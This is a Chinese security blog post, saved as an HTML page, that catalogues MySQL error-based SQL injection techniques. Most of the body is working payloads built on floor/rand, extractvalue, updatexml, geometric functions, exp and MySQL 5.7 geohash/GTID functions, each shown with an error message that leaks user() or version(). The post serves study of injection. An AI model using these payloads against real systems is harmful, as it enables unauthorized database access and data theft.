@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Mysql报错注入 | sh1yan&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="description" content="0x01 前言 法师的那本代码审计书，我也看到了关于十个报错注入那页（157-161），但是书上并没有特详细说明函数的意思还有剩下的都是点点就过了，再着我想到了 luanmap 就是纯粹的利用报错来注入的工具，所以我就整理整理关于 mysql 报错注入的总结把。 0x02 floor()   // 5.0 , 5.1 , 5.5 count() 匹配指定表，库里值的行数，也就是个数concat()">
+<meta name="keywords" content="mysql,报错注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql报错注入">
+<meta property="og:url" content="sh1yan.top/2018/02/19/mysql-Error-injection/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x01 前言 法师的那本代码审计书，我也看到了关于十个报错注入那页（157-161），但是书上并没有特详细说明函数的意思还有剩下的都是点点就过了，再着我想到了 luanmap 就是纯粹的利用报错来注入的工具，所以我就整理整理关于 mysql 报错注入的总结把。 0x02 floor()   // 5.0 , 5.1 , 5.5 count() 匹配指定表，库里值的行数，也就是个数concat()">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-06-14T12:50:57.901Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mysql报错注入">
+<meta name="twitter:description" content="0x01 前言 法师的那本代码审计书，我也看到了关于十个报错注入那页（157-161），但是书上并没有特详细说明函数的意思还有剩下的都是点点就过了，再着我想到了 luanmap 就是纯粹的利用报错来注入的工具，所以我就整理整理关于 mysql 报错注入的总结把。 0x02 floor()   // 5.0 , 5.1 , 5.5 count() 匹配指定表，库里值的行数，也就是个数concat()">
+  
+    <link rel="alternative" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/gossip">Gossip</a>
+        
+          <a class="main-nav-link" href="/yqlj">Links</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="sh1yan.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-mysql-Error-injection" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/02/19/mysql-Error-injection/" class="article-date">
+  <time datetime="2018-02-19T07:40:55.000Z" itemprop="datePublished">2018-02-19</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Mysql报错注入
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="sh1yan.top/2018/02/19/mysql-Error-injection/"></div>
+    </li>
+  </ul>
+</div>
+
+      
+      
+        
+        <p><strong>0x01</strong> 前言</p>
+<p>法师的那本代码审计书，我也看到了关于十个报错注入那页（157-161），但是书上并没有特详细说明函数的意思还有剩下的都是点点就过了，再着我想到了 luanmap 就是纯粹的利用报错来注入的工具，所以我就整理整理关于 mysql 报错注入的总结把。</p>
+<p><strong>0x02</strong> floor()   // 5.0 , 5.1 , 5.5</p>
+<p>count() 匹配指定表，库里值的行数，也就是个数<br>concat() 把里面的参数字符串连接起来<br>floor() 向下取整，就是取整数显示<br>rand() 用于产生一个 0~1的随机数<br>group by 根据自己的命名来分组数据，左边为右边的键，右边为值，可以这么理解，具体的自己百度吧<br><a id="more"></a><br>mysql&gt; select first_name from users where user_id=1 and (select 1 from (select count(<em>),concat(user(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);<br>ERROR 1062 (23000): Duplicate entry ‘root@localhost1’ for key ‘group_key’</p>
+<p>原理：通过 count(<em>) 来统计所查的数据库有多少个行数，其中以 concat() 拼接 user() 和 floor(rand(0)</em>2)) ，再配合上自己分组规则，导致统计时判断出错，从而造成的报错。</p>
+<p><strong>0x03</strong> extractvalue()   // 5.1 , 5.5 ， 报错结果32位长度限制</p>
+<p>extractvalue(XML_document, XPath_string) 从目标XML中返回包含所查询值的字符串</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)</p>
+<p>mysql&gt; select first_name from users where user_id=2 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost~’</p>
+<p>原理：由于第二位格式错误而导致的错误。</p>
+<p><strong>0x04</strong> updatexml()   // 5.1 , 5.5 , 报错结果32位长度限制</p>
+<p>updatexml(XML_document, XPath_string, new_value) 改变文档中符合条件的节点的值</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式</p>
+<p>mysql&gt; select first_name from users where user_id=3 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));<br>ERROR 1105 (HY000): XPATH syntax error: ‘~root@localhost~’</p>
+<p>原理：同 extractvalue() 一样，都是第二位格式错误到导致的错误。</p>
+<p><strong>0x05</strong> geometrycollection()   // 5.1 , 5.5</p>
+<p>geometrycollection(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20)) 一个好似坐标函数</p>
+<p>第一/二参数：坐标什么玩意，，，，<br>第三个参数：坐标里的一条直线，好像。。。</p>
+<p>mysql&gt; select first_name from users where user_id=4 and geometrycollection((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：通过 payload 可以大概的分析是嵌套式查询，然后这啥子的画图坐标无法识别然后报错（资料找不到啊啊啊）。</p>
+<p><strong>0x06</strong> polygon()   // 5.1 , 5.5 </p>
+<p>polygon() 一个几何操作的函数</p>
+<p>mysql&gt; select first_name from users where user_id=5 and polygon((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：几何都是抽象的，而我们的 payload 依旧是嵌套嵌套，不符合函数的匹配还是啥的就报错了。。。</p>
+<p><strong>0x07</strong> multipoint()   // 5.1 , 5.5</p>
+<p>multipoint() 从点值构造多点</p>
+<p>mysql&gt; select first_name from users where user_id=6 and multipoint((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：MP,杂都是类似几何的函数，，，原理同上。。。</p>
+<p><strong>0x08</strong> multilinestring()   // 5.1 , 5.5</p>
+<p>multilinestring() 是一种由LineStirng元素构成的MultiCurve几何对象集合</p>
+<p>mysql&gt; select first_name from users where user_id=7 and multilinestring((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：它也是数字坐标这样的用法，我们这里用了字符的样式，导致了报错。</p>
+<p><strong>0x09</strong> multipolygon()   // 5.1 , 5.5</p>
+<p>multipolygon() 是一种由Polygon元素构成的几何对象集合</p>
+<p>mysql&gt; select first_name from users where user_id=8 and multipolygon((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：这个函数的参数是 Polygon 元素，而我们传入了非元素，从而报错。</p>
+<p><strong>0x10</strong> linestring()   // 5.1 , 5.5</p>
+<p>LineString() 是具有点之间线性内插特性的Curve<br>LineString(1 1,2 2) 用法</p>
+<p>mysql&gt; select first_name from users where user_id=9 and linestring((select <em> from(select </em> from(select user())a)b));<br>ERROR 1367 (22007): Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from dual) <code>b</code>)’ value found during parsing</p>
+<p>原理：用法上的错误，从而导致的报错。</p>
+<p><strong>0x11</strong> exp()   // 5.1 , 5.5</p>
+<p>exp() 计算e的x次方</p>
+<p>mysql&gt; select first_name from users where user_id=10 and exp(~(select * from(select user())a));<br>ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’</p>
+<p>原理：其实这个是最简单的，exp()是计算e的次方的，参数本身就是数字，而报错语句通过子查询与按位求反来达到一个显错数据。</p>
+<p><strong>0x12</strong> mysql 5.7 中新增的报错函数   // 5.7.12</p>
+<p>PS ：这部分是直接抄的 luan 的笔记</p>
+<p>报错函数：</p>
+<p>ST_LatFromGeoHash() 返回一个字符串值从纬度Geohash作为双重价值的范围[−90, 90]   // 如果参数无效则报错，参数为数字型</p>
+<p>ST_LongFromGeoHash() 返回一个字符串值从经度Geohash作为双重价值的范围[−180, 180]   // 如果参数无效则报错，参数为数字型</p>
+<p>GTID_SUBSET() 给定两个集合的子集集合的全局事务ID和，如果所有子集gtids也在制定中。否则返回错误。   // GTID_SUBSET(subset,set)</p>
+<p>GTID_SUBTRACT() 给定两个集合的全局事务ID的集合和子集，只返回那些gtids从集合中的不在子集。   // GTID_SUBTRACT(set,subset)</p>
+<p>ST_PointFromGeoHash() 返回一个值,该值包含Geohash点的解码值，给定Geohash字符串值。   // 如果参数无效则报错，参数为数字型,xy坐标型函数</p>
+<p>案例：</p>
+<p>mysql&gt; select ST_LatFromGeoHash(version());<br>ERROR 1411 (HY000): Incorrect geohash value: ‘5.7.12-log’ for function ST_LATFROMGEOHASH</p>
+<p>mysql&gt; select ST_LongFromGeoHash(version());<br>ERROR 1411 (HY000): Incorrect geohash value: ‘5.7.12-log’ for function ST_LONGFROMGEOHASH</p>
+<p>mysql&gt; select GTID_SUBSET(version(),1);<br>ERROR 1772 (HY000): Malformed GTID set specification ‘5.7.12-log’.</p>
+<p>mysql&gt; select GTID_SUBTRACT(version(),1);<br>ERROR 1772 (HY000): Malformed GTID set specification ‘5.7.12-log’.</p>
+<p>mysql&gt; select ST_PointFromGeoHash(version(),1);<br>ERROR 1411 (HY000): Incorrect geohash value: ‘5.7.12-log’ for function st_pointfromgeohash</p>
+
+      
+      
+        
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="sh1yan.top/2018/02/19/mysql-Error-injection/" data-id="cl64hepec0018asw1m8r2514v" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mysql/">mysql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/报错注入/">报错注入</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-about" class="widget-title">About</h3>
+    <div class="widget">
+
+<!-- 优美的分割线 -->
+
+    <div style="width:249px;height:190px;border:1px none ;text-align:center">
+  <img src="//sh1yan.top/icon.png" alt="shiyan" style="width:190px;height:190px;display:inline-block;margin:0 auto">
+  </div>
+<br>
+
+
+<p style="font-size:15px">ID：shiyan</p>
+<p style="font-size:14px">个人简介：会开挖挖机的园工~</p>
+<p style="font-size:14px">
+<a href="mailto:506130869@qq.com">Email：506130869@qq.com</a><br>
+<a href="https://github.com/shiyan-520">GitHub：https://github.com/shiyan-520</a>
+</p>
+
+
+<!-- 优美的分割线 -->
+
+      
+      
+      <p></p>
+      
+      
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-tagcloud" class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/ByPass-UAC/" style="font-size: 10px;">ByPass-UAC</a> <a href="/tags/CMS/" style="font-size: 13.33px;">CMS</a> <a href="/tags/COM组件劫持/" style="font-size: 10px;">COM组件劫持</a> <a href="/tags/Cobalt-Strike/" style="font-size: 10px;">Cobalt Strike</a> <a href="/tags/DLL劫持/" style="font-size: 10px;">DLL劫持</a> <a href="/tags/Excel/" style="font-size: 13.33px;">Excel</a> <a href="/tags/JavaWeb/" style="font-size: 20px;">JavaWeb</a> <a href="/tags/Kerberos认证/" style="font-size: 10px;">Kerberos认证</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Python3/" style="font-size: 10px;">Python3</a> <a href="/tags/Rmi协议/" style="font-size: 10px;">Rmi协议</a> <a href="/tags/SMBMS/" style="font-size: 10px;">SMBMS</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/access-token/" style="font-size: 10px;">access token</a> <a href="/tags/burp/" style="font-size: 16.67px;">burp</a> <a href="/tags/hash/" style="font-size: 10px;">hash</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/jsonp/" style="font-size: 10px;">jsonp</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/mybatis/" style="font-size: 10px;">mybatis</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/pandas/" style="font-size: 10px;">pandas</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/spring5/" style="font-size: 10px;">spring5</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/vba/" style="font-size: 13.33px;">vba</a> <a href="/tags/web漏洞/" style="font-size: 13.33px;">web漏洞</a> <a href="/tags/令牌伪造/" style="font-size: 10px;">令牌伪造</a> <a href="/tags/动态代理/" style="font-size: 10px;">动态代理</a> <a href="/tags/博客源码/" style="font-size: 10px;">博客源码</a> <a href="/tags/博客问题解决/" style="font-size: 10px;">博客问题解决</a> <a href="/tags/反射/" style="font-size: 10px;">反射</a> <a href="/tags/域渗透/" style="font-size: 10px;">域渗透</a> <a href="/tags/学习笔记/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/安全审计/" style="font-size: 13.33px;">安全审计</a> <a href="/tags/安全服务/" style="font-size: 10px;">安全服务</a> <a href="/tags/工具分析/" style="font-size: 10px;">工具分析</a> <a href="/tags/序列化/" style="font-size: 10px;">序列化</a> <a href="/tags/报错注入/" style="font-size: 10px;">报错注入</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/生活记录/" style="font-size: 10px;">生活记录</a> <a href="/tags/端口转发/" style="font-size: 10px;">端口转发</a> <a href="/tags/脚本编写/" style="font-size: 10px;">脚本编写</a> <a href="/tags/部署上线/" style="font-size: 10px;">部署上线</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-recent-posts" class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/20/Mybatis-3-learning-notes/">mybatis-3学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/02/Spring-5-learning-notes/">Spring5学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/18/An-audit-of-Java-Web-smbms/">记一次对JavaWeb-SMBMS的审计</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/18/Java-RMI-protocol-learning/">Java Rmi协议学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/13/Java-Dynamic-agent-mode/">Java动态代理模式</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+    不要因为走了太久而忘记当初为什么出发。
+    <br>
+    Copyrights &copy; 2022 shiyan All Rights Reserved. 
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_uv"> 
+    <a>「</a>本站访客数<span id="busuanzi_value_site_uv"></span>人次<a>」</a>
+    </span></div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/gossip" class="mobile-nav-link">Gossip</a>
+  
+    <a href="/yqlj" class="mobile-nav-link">Links</a>
+  
+</nav>
+
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.4";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
